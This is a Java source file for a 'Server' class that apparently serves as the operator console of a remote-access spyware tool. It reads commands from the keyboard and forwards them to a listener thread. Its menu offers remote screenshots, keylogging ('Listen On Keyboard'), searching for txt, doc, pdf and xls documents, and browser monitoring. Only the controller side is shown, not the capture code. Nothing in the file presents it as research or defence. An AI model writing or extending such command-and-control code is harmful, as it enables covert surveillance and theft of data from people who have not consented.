package server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Observable;

public class Server extends Observable
{
    private boolean running;
    private int port;

    public synchronized boolean isRunning()
    {
        return running;
    }

    public synchronized void setRunning(boolean running)
    {
        this.running = running;
    }

    public int getPort()
    {
        return port;
    }

    public void setPort(String port)
    {
        this.port = Integer.parseInt(port);
    }

    public void startServer()
    {
        while(isRunning())
        {
            try
            {
                String message;
                do {
                    printMenu();

                    InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                    message = bufferedReader.readLine();

                    setChanged();

                    if (message.equals("quit")){
                        System.out.println("closing connection");
                        notifyObservers("0");
                    }
                    else
                    {
                        notifyObservers(message);
                    }

                } while(!message.equals("quit"));
            }
            catch(IOException ioException) {
                ioException.printStackTrace();
            } finally {
                setRunning(false);

                // shutdown gracefully
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void printMenu()
    {
        StringBuilder menu = new StringBuilder();
        menu.append("\nReady to send new commands\n");
        menu.append("select commands sepateing them by ';'\n");
        menu.append("i.e. x;y  \n");
        menu.append("\t0. Close Connection\n");
        menu.append("\t1. Print Screen\n");
        menu.append("\t2. Listen On Keyboard\n");
        menu.append("\t3. Search For Documents (txt,doc,pdf,xls)\n");
        menu.append("\t4. Listen To Browser");

        System.out.println(menu);
    }

    public static void main(String args[])
    {
        Server server = new Server();
        server.setPort(args[0]);

        final Listener listener = new Listener(server);
        Thread listenerThread = new Thread(listener);
        listenerThread.start();

        server.startServer();
        listener.stopListening();
    }
}
